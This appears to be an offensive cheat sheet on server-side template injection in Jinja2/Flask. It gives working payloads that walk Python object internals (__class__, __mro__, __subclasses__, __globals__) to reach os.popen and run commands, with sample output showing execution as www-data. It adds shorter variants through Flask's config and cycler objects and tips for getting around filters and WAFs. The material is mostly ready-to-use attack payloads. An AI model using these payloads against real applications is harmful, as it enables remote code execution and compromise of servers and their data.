Jinja2 — from 7×7 to RCE

the classic walk — reach os through __class__
{{ ''.__class__ }}
   → <class 'str'>

{{ ''.__class__.__mro__ }}
   → (<class 'str'>, <class 'object'>)

{{ ''.__class__.__mro__[1].__subclasses__() }}
   → [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>, ...]

{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() }}
   → uid=33(www-data) gid=33(www-data) groups=33(www-data)
shorter — via Flask's config
{{ config.__class__.__init__
   .__globals__['os'].popen('id').read() }}
payload-friendly — via cycler
{{ cycler.__init__.__globals__.os
   .popen('id').read() }}

The trick Every Python object exposes __class__. Walk to a class whose __init__ was defined in a module that imports os — then __globals__ hands you a live reference to os. From there, popen → RCE.

Filtered _ or .? Use request|attr('__class__'), or ['__class__'], or |attr+chain. Most WAFs lose this fight.
